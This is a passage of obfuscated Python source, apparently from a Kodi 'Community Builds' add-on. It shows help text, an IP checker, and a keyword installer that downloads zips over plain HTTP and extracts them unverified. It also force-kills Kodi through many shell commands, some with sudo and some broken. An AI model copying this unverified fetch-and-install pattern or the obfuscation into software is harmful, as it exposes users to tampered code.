 iIiIIi1 ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  Add Your Own Guides @ [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR]' , 'K0XIxEodUhc' , 'play_video' , 'How_To.png' , '' , '' , '' )
 iIiIIi1 ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  Community Builds FULL GUIDE' , "ewuxVfKZ3Fs" , 'play_video' , 'howto.png' , '' , '' , '' )
 iIiIIi1 ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  IMPORTANT initial settings' , "1vXniHsEMEg" , 'play_video' , 'howto.png' , '' , '' , '' )
 iIiIIi1 ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  Install a Community Build' , "kLsVOapuM1A" , 'play_video' , 'howto.png' , '' , '' , '' )
 iIiIIi1 ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  Fixing a half installed build (guisettings.xml fix)' , "X8QYLziFzQU" , 'play_video' , 'howto.png' , '' , '' , '' )
 iIiIIi1 ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  [COLOR=yellow](OLD METHOD)[/COLOR]Create a Community Build (part 1)' , "3rMScZF2h_U" , 'play_video' , 'howto.png' , '' , '' , '' )
 iIiIIi1 ( '' , '[COLOR=lime][VIDEO GUIDE][/COLOR]  [COLOR=yellow](OLD METHOD)[/COLOR]Create a Community Build (part 2)' , "C2IPhn0OSSw" , 'play_video' , 'howto.png' , '' , '' , '' )
 if 40 - 40: II111iiii
 if 7 - 7: Oo / OoO0O00
def oOOooOOOo0Oooo ( ) :
 Ii1Ii1IiIIIi1 ( 'Creating A Community Backup' ,
 '[COLOR=yellow]NEW METHOD[/COLOR][CR][COLOR=blue][B]Step 1:[/COLOR] Remove any sensitive data[/B][CR]Make sure you\'ve removed any sensitive data such as passwords and usernames in your addon_data folder.'
 '[CR][CR][COLOR=blue][B]Step 2:[/COLOR] Backup your system[/B][CR]Choose the backup option from the main menu, in there you\'ll find the option to create a Full Backup and this will create two zip files that you need to upload to a server.'
 '[CR][CR][COLOR=blue][B]Step 3:[/COLOR] Upload the zips[/B][CR]Upload the two zip files to a server that Kodi can access, it has to be a direct link and not somewhere that asks for captcha - Dropbox and archive.org are two good examples.'
 '[CR][CR][COLOR=blue][B]Step 4:[/COLOR] Submit build at [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR][/B]'
 '[CR]Create a thread on the Community Builds section of the forum at [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR].[CR]Full details can be found on there of the template you should use when posting, once you\'ve created your support thread (NOT BEFORE) you can request to become a member of the Community Builder group and you\'ll then have access to the web form for adding your builds to the portal.'
 '[CR][CR][COLOR=yellow]OLD METHOD[/COLOR][CR][COLOR=blue][B]Step 1: Backup your system[/B][/COLOR][CR]Choose the backup option from the main menu, you will be asked whether you would like to delete your addon_data folder. If you decide to choose this option [COLOR=yellow][B]make sure[/COLOR][/B] you already have a full backup of your system as it will completely wipe your addon settings (any stored settings such as passwords or any other changes you\'ve made to addons since they were first installed). If sharing a build with the community it\'s highly advised that you wipe your addon_data but if you\'ve made changes or installed extra data packages (e.g. skin artwork packs) then backup the whole build and then manually delete these on your PC and zip back up again (more on this later).'
 '[CR][CR][COLOR=blue][B]Step 2: Edit zip file on your PC[/B][/COLOR][CR]Copy your backup.zip file to your PC, extract it and delete all the addons and addon_data that isn\'t required.'
 '[CR][COLOR=blue]What to delete:[/COLOR][CR][COLOR=lime]/addons/packages[/COLOR] This folder contains zip files of EVERY addon you\'ve ever installed - it\'s not needed.'
 '[CR][COLOR=lime]/addons/<skin.xxx>[/COLOR] Delete any skins that aren\'t used, these can be very big files.'
 '[CR][COLOR=lime]/addons/<addon_id>[/COLOR] Delete any other addons that aren\'t used, it\'s easy to forget you\'ve got things installed that are no longer needed.'
 '[CR][COLOR=lime]/userdata/addon_data/<addon_id>[/COLOR] Delete any folders that don\'t contain important changes to addons. If you delete these the associated addons will just reset to their default values.'
 '[CR][COLOR=lime]/userdata/<all other folders>[/COLOR] Delete all other folders in here such as keymaps. If you\'ve setup profiles make sure you [COLOR=yellow][B]keep the profiles directory[/COLOR][/B].'
 '[CR][COLOR=lime]/userdata/Thumbnails/[/COLOR] Delete this folder, it contains all cached artwork. You can safely delete this but must also delete the file listed below.'
 '[CR][COLOR=lime]/userdata/Database/Textures13.db[/COLOR] Delete this and it will tell XBMC to regenerate your thumbnails - must do this if delting thumbnails folder.'
 '[CR][COLOR=lime]/xbmc.log (or Kodi.log)[/COLOR] Delete your log files, this includes any crashlog files you may have.'
 '[CR][CR][COLOR=blue][B]Step 3: Compress and upload[/B][/COLOR][CR]Use a program like 7zip to create a zip file of your remaining folders and upload to a file sharing site like dropbox.'
 '[CR][CR][COLOR=blue][B]Step 4: Submit build at [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR][/B][/COLOR]'
 '[CR]Create a thread on the Community Builds section of the forum at [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR][/B].[CR]Full details can be found on there of the template you should use when posting.' )
 if 39 - 39: OO0oo0oOO % i1IIi . I1ii11iIi11i - O0
 if 65 - 65: ooOo * ooOo / iii1I11ii1i1 + ooOo % OOo00O0 + OoOoOO00
def oOoOo000 ( ) :
 Ii1Ii1IiIIIi1 ( 'Installing a build' , '[COLOR=blue][B]Step 1 (Optional): Backup your system[/B][/COLOR][CR]When selecting an install option you\'ll be asked if you want to create a backup - we strongly recommend creating a backup of your system in case you don\'t like the build and want to revert back. Remember your backup may be quite large so if you\'re using a device with a very small amount of storage we recommend using a USB stick or SD card as the storage location otherwise you may run out of space and the install may fail.'
 '[CR][CR][COLOR=blue][B]Step 2: Choose an install method:[/B][/COLOR][CR][CR]-------------------------------------------------------[CR][CR][COLOR=lime]1. Fresh Install:[/COLOR] This will wipe all existing settings[CR]As the title suggests this will completely wipe all your current Kodi settings. Your settings will be replaced with the ones uploaded by the build author, some builders like to use this method (especially if they have the Live TV PVR setup) so always check the description to find out if they recommend using this method. This method is also great if you feel there\'s content installed on your Kodi install that may be causing issues, it will fully wipe your Kodi and install the build over the top.'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=lime]2. Install:[/COLOR] Keep my library & profiles[CR]This will install a build over the top of your existing setup so you won\'t lose anything already installed in Kodi. Your library and any profiles you may have setup will also remain unchanged.'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=lime]3. Install:[/COLOR] Keep my library only[CR]This will do exactly the same as number 2 (above) but it will delete any profiles you may have and replace them with the ones the build author has created.'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=lime]4. Install:[/COLOR] Keep my profiles only[CR]Again, the same as number 2 but your library will be replaced with the one created by the build author. If you\'ve spent a long time setting up your library and have it just how you want it then use this with caution and make sure you do a backup!'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=blue][B]Step 3: Replace or keep settings?[/COLOR][/B][CR]When completing the install process (only on options 2-4) you\'ll be asked if you want to keep your existing Kodi settings or replace with the ones in the build. If you choose to keep your settings then only the important skin related settings are copied over from the build. All your other Kodi settings such as screen calibration, region, audio output, resolution etc. will remain intact. Choosing to replace your settings could possibly cause a few issues, unless the build author has specifically recommended you replace the settings with theirs we would always recommend keeping your own.'
 '[CR][CR][COLOR=blue][B]Step 4: [/COLOR][COLOR=red]VERY IMPORTANT[/COLOR][/B][CR]For the install to complete properly Kodi MUST force close, this means forcing it to close via your operating system rather than elegantly via the Kodi menu. By default this add-on will attempt to make your operating system force close Kodi but there are systems that will not allow this (devices that do not allow Kodi to have root permissions).'
 ' Once the final step of the install process has been completed you\'ll see a dialog explaining Kodi is attempting a force close, please be patient and give it a minute. If after a minute Kodi hasn\'t closed or restarted you will need to manually force close. The recommended solution for force closing is to go into your operating system menu and make it force close the Kodi app but if you dont\'t know how to do that you can just pull the power from the unit.'
 ' Pulling the power is fairly safe these days, on most set top boxes it\'s the only way to switch them off - they rarely have a power switch. Even though it\'s considered fairly safe nowadays you do this at your own risk and we would always recommend force closing via the operating system menu.' )
 if 37 - 37: oo0oooooO0
 if 15 - 15: o0oOOo0O0Ooo % OoO0O00 / oo0oooooO0
def II1IIIi ( ) :
 Ii1Ii1IiIIIi1 ( 'What is a community build' , 'Community Builds are pre-configured builds of XBMC/Kodi based on different users setups. Have you ever watched youtube videos or seen screenshots of Kodi in action and thought "wow I wish I could do that"? Well now you can have a brilliant setup at the click of a button, completely pre-configured by users on the [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR][/B] forum. If you\'d like to get involved yourself and share your build with the community it\'s very simple to do, just go to the forum where you\'ll find full details or you can follow the guide in this addon.' )
 if 40 - 40: i1IIi / OoooooooOO / Oo * iI1iiIiiII - o0oOOo0O0Ooo
 if 77 - 77: i1IIi - iIii1I11I1II1 . Oo
def IIiiIiIIiI1 ( url = 'http://www.iplocation.net/' , inc = 1 ) :
 i11111I1IOoo0ooOOOOoOo = re . compile ( "<td width='80'>(.+?)</td><td>(.+?)</td><td>(.+?)</td><td>.+?</td><td>(.+?)</td>" ) . findall ( oO0 . http_GET ( url ) . content )
 for I1IiIoO0o0o , O000oo0o0o , oo0 , I1I1iiI1i in i11111I1IOoo0ooOOOOoOo :
  if inc < 2 : O0OoO000O0OO = xbmcgui . Dialog ( ) ; O0OoO000O0OO . ok ( 'Check My IP' , "[B][COLOR gold]Your IP Address is: [/COLOR][/B] %s" % I1IiIoO0o0o , '[B][COLOR gold]Your IP is based in: [/COLOR][/B] %s' % oo0 , '[B][COLOR gold]Your Service Provider is:[/COLOR][/B] %s' % I1I1iiI1i )
  inc = inc + 1
  if 42 - 42: OoooooooOO - OoOoOO00 - Oo * iI1iiIiiII
  if 98 - 98: OoO0O00 . iIii1I11I1II1 % Oo0Ooo + OoooooooOO
def I1Ii111I111 ( url ) :
 if not os . path . exists ( OOO00O ) :
  os . makedirs ( OOO00O )
  if 7 - 7: I1IiiI
 i111i11iI1i1I = ''
 ooOoO = 'Enter Keyword'
 IiI1 = Iiii11IiI ( ooOoO )
 i111i11iI1i1I = url + IiI1
 II1iOOoOooO0o = os . path . join ( OOO00O , IiI1 + '.zip' )
 if 14 - 14: iii1I11ii1i1 - Oo0Ooo . Oo0Ooo * Oo . I1IiiI % oo0oooooO0
 if IiI1 != '' :
  OO00OO = O0OoO000O0OO . yesno ( 'Backup existing setup' , 'Installing certain keywords can result in some existing settings or add-ons to be replaced. Would you like to create a backup before proceeding?' )
  if 27 - 27: O0 * I1IiiI - iIii1I11I1II1 - oo0oooooO0 % O0 . Oo0Ooo
  if OO00OO == 1 :
   I1ii11IiI1I ( )
   if 88 - 88: iIii1I11I1II1 . OoooooooOO % O0 % OOo00O0 . i11iIiiIii
  try :
   print "Attempting download " + i111i11iI1i1I + " to " + II1iOOoOooO0o
   iiI1IiI . create ( "Web Installer" , "Downloading " , '' , 'Please Wait' )
   downloader . download ( i111i11iI1i1I , II1iOOoOooO0o )
   print "### Keyword " + IiI1 + " Successfully downloaded"
   iiI1IiI . update ( 0 , "" , "Extracting Zip Please Wait" )
   if 80 - 80: O0 . I1IiiI
   if zipfile . is_zipfile ( II1iOOoOooO0o ) :
    if 53 - 53: OOo00O0 / OoooooooOO - II111iiii
    try :
     O0OoOoO00O ( II1iOOoOooO0o , II , iiI1IiI )
     xbmc . executebuiltin ( 'UpdateLocalAddons' )
     xbmc . executebuiltin ( 'UpdateAddonRepos' )
     O0OoO000O0OO . ok ( "[COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR]" , "" , "Content now installed" , "" )
     iiI1IiI . close ( )
     if 68 - 68: OoooooooOO . OoooooooOO . iIii1I11I1II1 / OOo00O0 - iii1I11ii1i1 % O0
    except :
     O0OoO000O0OO . ok ( "Error with zip" , 'There was an error trying to install this file. It may possibly be corrupt, either try again or contact the author of this keyword.' )
     print "### Unable to install keyword (passed zip check): " + IiI1
   else :
    O0OoO000O0OO . ok ( "Keyword Error" , 'The keyword you typed could not be installed. Please check the spelling and if you continue to receive this message it probably means that keyword is no longer available.' )
    if 19 - 19: OoooooooOO * ooOo
  except :
   O0OoO000O0OO . ok ( "Keyword Error" , 'The keyword you typed could not be installed. Please check the spelling and if you continue to receive this message it probably means that keyword is no longer available.' )
   print "### Unable to install keyword (unknown error, most likely a typo in keyword entry): " + IiI1
   if 60 - 60: II111iiii - oo0oooooO0 + o0oOOo0O0Ooo % Oo
 if os . path . exists ( II1iOOoOooO0o ) :
  os . remove ( II1iOOoOooO0o )
  if 97 - 97: O0 % O0
  if 35 - 35: oo0oooooO0 - OO0oo0oOO . i11iIiiIii % O0 % I1ii11iIi11i
def o0OOOoOO00o ( ) :
 if 92 - 92: Oo % II111iiii . oo0oooooO0
 if xbmc . getCondVisibility ( 'system.platform.windows' ) :
  print "############   try windows force close  #################"
  try :
   os . system ( '@ECHO off' )
   os . system ( 'TASKKILL /im Kodi.exe /f' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'tskill Kodi.exe' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'tskill XBMC.exe' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'TASKKILL /im XBMC.exe /f' )
  except : pass
 elif xbmc . getCondVisibility ( 'system.platform.osx' ) :
  print "############   try osx force close  #################"
  try : os . system ( 'killall -9 XBMC' )
  except : pass
  try : os . system ( 'killall -9 Kodi' )
  except : pass
 else :
  if 46 - 46: OoOoOO00 + I1IiiI % OoooooooOO * i11iIiiIii - Oo0Ooo
  print "############   try linux force close  #################"
  try : os . system ( 'killall XBMC' )
  except : pass
  try : os . system ( 'killall Kodi' )
  except : pass
  try : os . system ( 'killall -9 xbmc.bin' )
  except : pass
  try : os . system ( 'killall -9 kodi.bin' )
  except : pass
  if 47 - 47: oo0oooooO0 * OoOoOO00 * oOoO0o00OO0
  print "############   try atv force close  #################"
  try : os . system ( 'killall AppleTV' )
  except : pass
  print "############   try raspbmc force close  #################"
  try : os . system ( 'sudo initctl stop kodi' )
  except : pass
  try : os . system ( 'sudo initctl stop xbmc' )
  except : pass
  if 46 - 46: OO0oo0oOO
  print "############   try android force close  #################"
  try : os . system ( 'adb shell am force-stop org.xbmc.kodi' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.kodi' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.xbmc.xbmc' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.xbmc' )
  except : pass
  try : os . system ( 'adb shell kill org.xbmc.kodi' )
  except : pass
  try : os . system ( 'adb shell kill org.kodi' )
  except : pass
  try : os . system ( 'adb shell kill org.xbmc.xbmc' )
  except : pass
  try : os . system ( 'adb shell kill org.xbmc' )
  except : pass
  try : os . system ( 'Process.killProcess(android.os.Process.org.xbmc,kodi());' )
  except : pass
  try : os . system ( 'Process.killProcess(android.os.Process.org.kodi());' )
  except : pass
  try : os . system ( 'Process.killProcess(android.os.Process.org.xbmc.xbmc());' )
  except : pass
  try : os . system ( 'Process.killProcess(android.os.Process.org.xbmc());' )
  except : pass
  O0OoO000O0OO . ok ( 'Force Close Required' , 'On the following screen please click the big button at the top which says "KILL selected apps". If it\'s the first time you ran that program a menu will pop up first.  Click "OK" then "Kill selected apps. Please be patient while your system updates the necessary files ' )
  try : xbmc . executebuiltin ( 'StartAndroidActivity(com.rechild.advancedtaskkiller)' )
  except : pass
  if 42 - 42: iIii1I11I1II1
  if 32 - 32: Oo0Ooo - OO0oo0oOO . OoooooooOO - OoooooooOO - Oo0Ooo . iIii1I11I1II1
def ii1IiI ( ) :
 xbmc . executebuiltin ( 'ReplaceWindow(settings)' )
 if 73 - 73: OoooooooOO * O0 * OOo00O0
 if 7 - 7: II111iiii + i1IIi
 if 95 - 95: i11iIiiIii + OoooooooOO / Oo - iIii1I11I1II1 + iIii1I11I1II1
 if 29 - 29: oOoO0o00OO0 % OOo00O0 + OoO0O00 . i1IIi + I1IiiI
def I1ii11IiI1I ( ) :
 III1II1i ( )
 if 24 - 24: iI1iiIiiII / OO0oo0oOO * I1ii11iIi11i - OoooooooOO / I1IiiI . ooOo
 II1Ii1I1i = xbmc . translatePath ( os . path . join ( iIo00O , 'Community Builds' , 'My Builds' , '' ) )
 OOooOooo0OOo0 = xbmc . translatePath ( os . path . join ( iIo00O , 'Community Builds' , 'My Builds' , 'my_full_backup.zip' ) )
 oo0o0OoOO0o0 = xbmc . translatePath ( os . path . join ( iIo00O , 'Community Builds' , 'My Builds' , 'my_full_backup_GUI_Settings.zip' ) )
 if 98 - 98: i1IIi - oo0oooooO0
 if not os . path . exists ( II1Ii1I1i ) :
  os . makedirs ( II1Ii1I1i )
  if 49 - 49: o0oOOo0O0Ooo . OO0oo0oOO . ooOo
 IiI1Iii1 = Ooooo ( heading = "Enter a name for this backup" )
 if 9 - 9: oOoO0o00OO0 - II111iiii * OoO0O00
 if ( not IiI1Iii1 ) :
  return False , 0
  if 78 - 78: iIii1I11I1II1 / O0 * ooOo / oo0oooooO0 / OoOoOO00
 ooOoO = urllib . quote_plus ( IiI1Iii1 )
 ii1iII = xbmc . translatePath ( os . path . join ( II1Ii1I1i , ooOoO + '.zip' ) )
 O00oo = [ I1IiI ]
 OoOoooO000OO = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'Thumbs.db' , '.gitignore' ]
 i11i11 = "Creating full backup of existing build"
 i11IiI1iiI11 = "Creating Community Build"
 Ii11Iii = "Archiving..."
 ooo00OoOO0o = ""
 oo0O0o = "Please Wait"
 if 15 - 15: OOo00O0 / ooOo
 iIIi1iI1I1IIi ( II , OOooOooo0OOo0 , i11i11 , Ii11Iii , ooo00OoOO0o , oo0O0o , O00oo , OoOoooO000OO )
 O0OoO000O0OO . ok ( 'Full Backup Complete' , 'You can locate your backup at:[COLOR=dodgerblue]' , OOooOooo0OOo0 + '[/COLOR]' )
 if 54 - 54: OOo00O0 - iIii1I11I1II1 - iii1I11ii1i1 % OO0oo0oOO / II111iiii
 if 80 - 80: i11iIiiIii % iIii1I11I1II1 / i11iIiiIii
def OOoOO0ooo0O ( ) :
 i11I1IiiiiiiiIi = xbmc . getInfoLabel ( "System.BuildVersion" )
 Oo0 = float ( i11I1IiiiiiiiIi [ : 4 ] )
 if 17 - 17: OOo00O0
 if Oo0 < 14 :
  IIi1IIII = os . path . join ( o00OO00OoO , 'xbmc.log' )
  Ii1Ii1IiIIIi1 ( 'XBMC Log' , IIi1IIII )
  if 33 - 33: II111iiii . I1ii11iIi11i - O0 * iIii1I11I1II1 % O0 . OoooooooOO
 else :
  IIi1IIII = os . path . join ( o00OO00OoO , 'kodi.log' )
  Ii1Ii1IiIIIi1 ( 'Kodi Log' , IIi1IIII )
  if 53 - 53: OO0oo0oOO / I1IiiI * OO0oo0oOO + o0oOOo0O0Ooo + ooOo - Oo0Ooo
  if 16 - 16: OoO0O00 % iI1iiIiiII . i1IIi / I1ii11iIi11i - O0
def ooiIi11i1I11Ii ( ) :
 O0OoO000O0OO . ok ( "Restore local guisettings fix" , "You should [COLOR=lime]ONLY[/COLOR] use this option if the guisettings fix is failing to download via the addon. Installing via this method means you do not receive notifications of updates" )
 oo0OO0oo ( )
 if 54 - 54: II111iiii % o0oOOo0O0Ooo - i1IIi . I1IiiI - II111iiii / iIii1I11I1II1
 if 29 - 29: ooOo
def Ooo000 ( mode ) :
 if not mode . endswith ( "premium" ) and not mode . endswith ( "public" ) and not mode . endswith ( "private" ) :
  IiI1Iii1 = Ooooo ( heading = "Search for content" )
  if 21 - 21: oo0oooooO0 % oOoO0o00OO0 % Oo0Ooo % O0
  if ( not IiI1Iii1 ) :
   return False , 0
   if 63 - 63: II111iiii * I1IiiI - OoooooooOO / I1IiiI
  ooOoO = urllib . quote_plus ( IiI1Iii1 )
  if 50 - 50: OoOoOO00 % OO0oo0oOO + OoOoOO00 * OO0oo0oOO - Oo
  if mode == 'tutorials' :
   OOoo0OOOo0o ( 'name=' + ooOoO )
   if 94 - 94: iIii1I11I1II1
  if mode == 'hardware' :
   oooOO0OO0 ( 'name=' + ooOoO )
   if 1 - 1: O0
  if mode == 'news' :
   Ii1IIi11 ( 'name=' + ooOoO )
   if 2 - 2: OoO0O00 . iii1I11ii1i1
 if mode . endswith ( "premium" ) or mode . endswith ( "public" ) or mode . endswith ( "private" ) :
  iIiIIi1 ( 'folder' , 'Search By Name' , mode + '&name=' , 'search_builds' , 'Manual_Search.png' , '' , '' , '' )
  iIiIIi1 ( 'folder' , 'Search By Uploader' , mode + '&author=' , 'search_builds' , 'Search_Genre.png' , '' , '' , '' )
  iIiIIi1 ( 'folder' , 'Search By Audio Addons Installed' , mode + '&audio=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  iIiIIi1 ( 'folder' , 'Search By Picture Addons Installed' , mode + '&pics=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  iIiIIi1 ( 'folder' , 'Search By Program Addons Installed' , mode + '&progs=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  iIiIIi1 ( 'folder' , 'Search By Video Addons Installed' , mode + '&vids=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  iIiIIi1 ( 'folder' , 'Search By Skins Installed' , mode + '&skins=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  if 97 - 97: Oo0Ooo
  if 65 - 65: Oo0Ooo % Oo / i11iIiiIii / iIii1I11I1II1 . iI1iiIiiII + OOo00O0
def o0000oo0O ( url ) :
 iIII1I111III = 'http://noobsandnerds.com/TI/LatestNews/LatestNews.php?id=%s' % ( url )
 IIo0o0O0O00oOOo = iIIIiIi ( iIII1I111III ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 I1i1i1iii = re . compile ( 'name="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iiI1i = re . compile ( 'author="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OoOo0 = re . compile ( 'date="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 ooOoO00 = re . compile ( 'content="(.+?)###END###"' ) . findall ( IIo0o0O0O00oOOo )
 if 22 - 22: i11iIiiIii + OoOoOO00 + OoooooooOO
 ooO = I1i1i1iii [ 0 ] if ( len ( I1i1i1iii ) > 0 ) else ''
 I11II1i1 = iiI1i [ 0 ] if ( len ( iiI1i ) > 0 ) else ''
 OoIi11ii1 = OoOo0 [ 0 ] if ( len ( OoOo0 ) > 0 ) else ''
 O0oiIiiiiI1II1I1 = ooOoO00 [ 0 ] if ( len ( ooOoO00 ) > 0 ) else ''
 I1111ii11 = I1I1i1i ( O0oiIiiiiI1II1I1 )
 i1i1IIii1i1 = str ( '[COLOR=orange]Source: [/COLOR]' + I11II1i1 + '     [COLOR=orange]Date: [/COLOR]' + OoIi11ii1 + '[CR][CR][COLOR=lime]Details: [/COLOR][CR]' + I1111ii11 )
 if 19 - 19: OOo00O0 % I1ii11iIi11i . I1ii11iIi11i * OO0oo0oOO % iii1I11ii1i1
 Ii1Ii1IiIIIi1 ( ooO , i1i1IIii1i1 )
 if 75 - 75: Oo0Ooo . oo0oooooO0
 if 55 - 55: iii1I11ii1i1 * I1IiiI - ooOo
def I11i11 ( url ) :
 if iI1Ii11111iIi == 'true' :
  iIiIIi1 ( '' , '[COLOR=orange]Latest ' + I1IiiI + ' news[/COLOR]' , I1IiiI , 'notify_msg' , 'LatestNews.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , 'news' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=lime][All News][/COLOR] From all sites' , str ( url ) + '' , 'grab_news' , 'Latest.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Official Kodi.tv News' , str ( url ) + '&author=Official%20Kodi' , 'grab_news' , 'XBMC.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'OpenELEC News' , str ( url ) + '&author=OpenELEC' , 'grab_news' , 'OpenELEC.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Raspbmc News' , str ( url ) + '&author=Raspbmc' , 'grab_news' , 'Raspbmc.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , '[COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR] News' , str ( url ) + '&author=noobsandnerds' , 'grab_news' , 'noobsandnerds.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'XBMC4Xbox News' , str ( url ) + '&author=XBMC4Xbox' , 'grab_news' , 'XBMC4Xbox.png' , '' , '' , '' )
 if 68 - 68: O0 * iIii1I11I1II1 / iI1iiIiiII
 if 65 - 65: Oo - I1IiiI * iI1iiIiiII
def oO00O0O000OO ( title , message , times , icon ) :
 icon = I11i1I1I + icon
 xbmc . executebuiltin ( "XBMC.Notification(" + title + "," + message + "," + times + "," + icon + ")" )
 if 58 - 58: iI1iiIiiII - iii1I11ii1i1
def Oo0O0O0 ( url ) :
 O0Oo0 = xbmc . translatePath ( os . path . join ( OooO0 , I1IiI , 'notification.txt' ) )
 if 22 - 22: OO0oo0oOO + ooOo . OoOoOO00
 if not os . path . exists ( O0Oo0 ) :
  Oo0oO00 = open ( O0Oo0 , mode = 'w' )
  Oo0oO00 . write ( '20150101000000' )
  Oo0oO00 . close ( )
  if 84 - 84: i11iIiiIii / o0oOOo0O0Ooo % iIii1I11I1II1 . OOo00O0 . OoO0O00 / oo0oooooO0
 ooooo0oo0OO = open ( O0Oo0 , 'r' ) . read ( )
 if 41 - 41: Oo0Ooo / OoO0O00 / OoOoOO00 - i11iIiiIii - OoOoOO00
 iIII1I111III = 'http://120.24.252.100/TI/Community_Builds/notify?reseller=%s' % ( I1IiiI )
 IIo0o0O0O00oOOo = iIIIiIi ( iIII1I111III ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 i1oo0OO0Oo = re . compile ( 'notify="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 OoOo0 = re . compile ( 'date="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
 iIIi111I1i1i = i1oo0OO0Oo [ 0 ] if ( len ( i1oo0OO0Oo ) > 0 ) else 'No news items available'
 IiIii111III1 = OoOo0 [ 0 ] if ( len ( OoOo0 ) > 0 ) else ''
 IiI1I1iii = IiIii111III1 . replace ( '-' , '' ) . replace ( ' ' , '' ) . replace ( ':' , '' )
 if 34 - 34: OoooooooOO
 if int ( ooooo0oo0OO ) < int ( IiI1I1iii ) :
  Oo0oO00 = open ( O0Oo0 , mode = 'w' )
  Oo0oO00 . write ( IiI1I1iii )
  Oo0oO00 . close ( )
  O0OoO000O0OO . ok ( 'Latest ' + I1IiiI + ' News' , iIIi111I1i1i )
  if 84 - 84: i11iIiiIii + OO0oo0oOO
 else :
  O0OoO000O0OO . ok ( 'Latest ' + I1IiiI + ' News' , iIIi111I1i1i )
  if 81 - 81: i11iIiiIii % I1IiiI / oo0oooooO0 % OoO0O00 / iI1iiIiiII % iIii1I11I1II1
  if 14 - 14: I1ii11iIi11i * Oo0Ooo + i11iIiiIii % Oo - ooOo
def iIIiio000oo ( ) :
 xbmc . executebuiltin ( 'ActivateWindow(filemanager,return)' )
 return
 if 58 - 58: OOo00O0 + II111iiii + OO0oo0oOO . OoooooooOO
 if 42 - 42: iIii1I11I1II1 / iii1I11ii1i1 . O0 . OO0oo0oOO
def Ii1i111iI ( ) :
 xbmc . executebuiltin ( 'ActivateWindow(systeminfo)' )
 if 48 - 48: Oo0Ooo
 if 64 - 64: iIii1I11I1II1 % o0oOOo0O0Ooo . O0 * o0oOOo0O0Ooo
def iIIIiIi ( url ) :
 O00O = urllib2 . Request ( url )
 O00O . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 10.0; WOW64; Windows NT 5.1; en-GB; rv:1.9.0.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 Gecko/2008092417 Firefox/3.0.3' )
 if 23 - 23: OoO0O00 . oOoO0o00OO0
 o0OO00oO00 = urllib2 . urlopen ( O00O )
 IIo0o0O0O00oOOo = o0OO00oO00 . read ( )
 o0OO00oO00 . close ( )
 return IIo0o0O0O00oOOo . replace ( '\r' , '' ) . replace ( '\n' , '' ) . replace ( '\t' , '' )
 if 65 - 65: I1ii11iIi11i . OO0oo0oOO / i11iIiiIii + O0 . oOoO0o00OO0
 if 15 - 15: Oo0Ooo + oo0oooooO0 + I1IiiI * o0oOOo0O0Ooo
def iII1111IIIIiI ( ) :
 import tarfile
 if 35 - 35: II111iiii - II111iiii / o0oOOo0O0Ooo / I1IiiI
 if not os . path . exists ( OOOO0OOoO0O0 ) :
  os . makedirs ( OOOO0OOoO0O0 )
  if 91 - 91: I1IiiI - oo0oooooO0 / OoO0O00 - OoO0O00 / OO0oo0oOO - oOoO0o00OO0
 iiI1IiI . create ( "Creating Backup" , "Adding files... " , '' , 'Please Wait' )
 I1IIi = tarfile . open ( os . path . join ( OOOO0OOoO0O0 , O00OIiIIiIiIIiI ( ) + '.tar' ) , 'w' )
 if 26 - 26: OOo00O0 % OoooooooOO . iI1iiIiiII * OOo00O0 + II111iiii - I1ii11iIi11i
 for i1IIIii in O0ii1ii1ii :
